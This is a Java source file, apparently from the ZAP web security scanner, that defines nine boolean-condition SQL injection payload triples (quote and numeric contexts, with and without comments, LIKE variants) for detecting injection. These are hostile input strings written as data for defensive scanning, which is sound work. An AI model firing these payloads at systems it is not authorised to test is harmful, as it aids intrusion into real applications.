/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2026 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrules.sqli.strategies;

import java.util.List;

/**
 * Boolean condition payloads for SQL injection testing, ported verbatim from baseline rule
 * 40018 (SqlInjectionScanRule.java, lines 347-387). Each triple contains an AND_TRUE, AND_FALSE,
 * and OR_TRUE variant to support the restrict→broaden fallback cascade: try AND_TRUE; if it
 * matches baseline, try AND_FALSE; if AND_FALSE also matches (meaning no distinguishing data),
 * fall back to OR_TRUE as a final attempt to detect injection.
 *
 * <p>The 9 triples target string contexts (single/double quote, with/without trailing comment)
 * and numeric contexts, matching baseline's empirical strategy.
 */
public class BooleanConditionPayloads {

    public record Condition(String andTrue, String andFalse, String orTrue) {}

    /** 9 boolean condition triples, ordered as baseline sends them. */
    public static final List<Condition> CONDITIONS =
            List.of(
                    // String context: single quote with comment
                    new Condition(
                            "' AND '1'='1' -- ",
                            "' AND '1'='2' -- ",
                            "' OR '1'='1' -- "),
                    // String context: double quote with comment
                    new Condition(
                            "\" AND \"1\"=\"1\" -- ",
                            "\" AND \"1\"=\"2\" -- ",
                            "\" OR \"1\"=\"1\" -- "),
                    // Numeric context with comment
                    new Condition(" AND 1=1 -- ", " AND 1=2 -- ", " OR 1=1 -- "),
                    // String context: single quote without comment
                    new Condition(
                            "' AND '1'='1",
                            "' AND '1'='2",
                            "' OR '1'='1"),
                    // String context: double quote without comment
                    new Condition(
                            "\" AND \"1\"=\"1",
                            "\" AND \"1\"=\"2",
                            "\" OR \"1\"=\"1"),
                    // Numeric context without comment
                    new Condition(" AND 1=1", " AND 1=2", " OR 1=1"),
                    // LIKE patterns: string context
                    new Condition(
                            "' AND 'a' LIKE 'a",
                            "' AND 'a' LIKE 'b",
                            "' OR 'a' LIKE 'a"),
                    // LIKE patterns: numeric (safer variant)
                    new Condition(
                            "1 AND '1' LIKE '1",
                            "1 AND '1' LIKE '2",
                            "1 OR '1' LIKE '1"),
                    // LIKE pattern variant
                    new Condition(
                            "' AND 'x' LIKE 'x",
                            "' AND 'x' LIKE 'y",
                            "' OR 'x' LIKE 'x"));

    private BooleanConditionPayloads() {}
}
